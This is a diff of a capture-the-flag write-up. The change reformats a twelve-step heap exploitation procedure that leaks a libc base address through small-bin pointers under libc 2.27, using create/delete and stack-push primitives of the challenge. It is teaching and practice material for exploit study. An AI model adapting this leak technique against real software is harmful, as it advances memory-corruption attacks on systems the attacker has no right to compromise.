@@ -92,18 +92,19 @@ Since we can alter heap pointers, let's see what can be done to leak address.
 To leak libc\_base, the most intuitive way is to free a unsorted\_bin\_chunk and leak the pointer, and in libc2.27, this means freeing a chunk of large\_bin size. But actually, due to the indirect reference through meta chunk, leaking the pointer directly would be a little bit harder than dereferencing it and using it to leak pointers in main_arena  
 
 The procedure would be something as below
-1. S0 = create(0x500)```	# target chunk```
-2. (create(0x10))*9```		# pad up storage index```
+1. S0 = create(0x500)
+		# target chunk
+2. (create(0x10))*9		# pad up storage index
 3. delete(S0)
 4. delete(S9)
-5. S0 = create(0x10)```	# replace S0 with original S9 chunk```
-6. S9 = create(0x10)```	# malloc a chunk in the front of target chunk, and in Storage[9], so we can easily manipulate it```
-7. push 0x40```			# offset from S9_ptr to unsorted\_chunk```
-8. add*3```				# add 0x40 to S9_ptr```
-9. (push 0x0)*2```			# re-adjust stack\_top to stack\_buffer, so that printing stack won't be truncated```
-10. push 10```				# push a '\n' just for convenience, not necessary```
-11. (extract S9[0x25-i])*6```	# get small\_bin addr onto stack```
-12. writestack```			# print small\_bin address```
+5. S0 = create(0x10)	# replace S0 with original S9 chunk
+6. S9 = create(0x10)	# malloc a chunk in the front of target chunk, and in Storage[9], so we can easily manipulate it
+7. push 0x40			# offset from S9\_ptr to unsorted\_chunk
+8. add*3				# add 0x40 to S9\_ptr
+9. (push 0x0)*2			# re-adjust stack\_top to stack\_buffer, so that printing stack won't be truncated
+10. push 10				# push a '\n' just for convenience, not necessary
+11. (extract S9[0x25-i])*6	# get small\_bin addr onto stack
+12. writestack			# print small\_bin address
 
 
 The heap would look something like this after adding 0x40 to Storage[9]\_ptr
